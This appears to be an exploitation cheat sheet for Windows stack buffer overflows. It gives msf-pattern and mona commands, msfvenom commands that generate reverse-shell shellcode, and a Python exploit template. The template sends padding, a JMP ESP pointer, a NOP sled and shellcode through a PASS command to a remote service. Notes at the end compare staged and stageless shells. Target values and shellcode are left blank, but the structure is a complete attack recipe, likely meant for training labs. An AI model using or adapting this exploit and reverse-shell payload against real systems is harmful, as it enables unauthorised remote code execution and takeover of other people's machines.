# Commands
```
/usr/bin/msf-pattern_create -l 
/usr/bin/msf-pattern_offset -q

# avoid pointers with bad chars
# !mona jmp -r esp -cpb "\x00\x0a\x0d"
# try selecting an application specific DLL instead of OS
!mona jmp -r esp -cpb '\x00'

# Do	NOT	add an encoder by yourself, let msfvenom decide that
# [Recommended, reasons at the bottom] Stageless - use nc to connect to this shell 
msfvenom -p windows/shell_reverse_tcp LHOST= LPORT=443 -b '\x00' -f python --var-name shellcode EXITFUNC=thread

# Do	NOT	add an encoder by yourself, let msfvenom decide that
# Staged - use multi/handler to connect to this shell
msfvenom -p windows/shell/reverse_tcp LHOST= LPORT=443 -b '\x00' -f python --var-name shellcode EXITFUNC=thread
```

# cheatsheet.py
```
import socket
import struct
import sys

rhost = "192.168."
rport =

size = 3200

cmd = "PASS "

eip_offset = 

# Only select program DLL. Do  NOT  select OS DLL
ptr_jmp_esp = # JMP ESP - xxxx.dll

# Bad characters identified: \x00
badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

# msfvenom -p windows/shell_reverse_tcp LHOST= LPORT=443 -b '\x00' -f python --var-name shellcode EXITFUNC=thread
# Remove the "b" prefix from each line
shellcode = ""

payload = ""
payload += cmd
payload += "A"*eip_offset # padding
payload += struct.pack("<I",ptr_jmp_esp) # converting address to little endian
payload += "\x90"*16 # nopsled
payload += shellcode
payload += "D"*(size - len(payload)) # trialing padding
payload += "\r\n"

# Put a while loop to fuzz
# while True:
try:
	print "Sending evil payload..."
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((rhost,rport))
	s.recv(1024)
	s.send("USER test\r\n")
	s.recv(1024)
	s.send(payload)
	s.recv(1024)
	s.send("QUIT")
	s.close()
    # Fuzzing increment
	#payload += "A"
except:
	print "Oops! Something went wrong!"
	#print "Fuzzing crashed at %s bytes" % len(payload)
	sys.exit()
```
* * *

**Why stageless:**
- Less the number of exploitation steps, the better
- More control over the shell execution process
- The stager that gets dropped in the staged shell, could be blocked or unable to execute for plethora of reasons unknown to you
- It’s more of a Metasploit thing, which could be one of the reasons it may get blocked

**Why staged:**
- Tried increasing the payload buffer but not enough space to fit a stageless shellcode



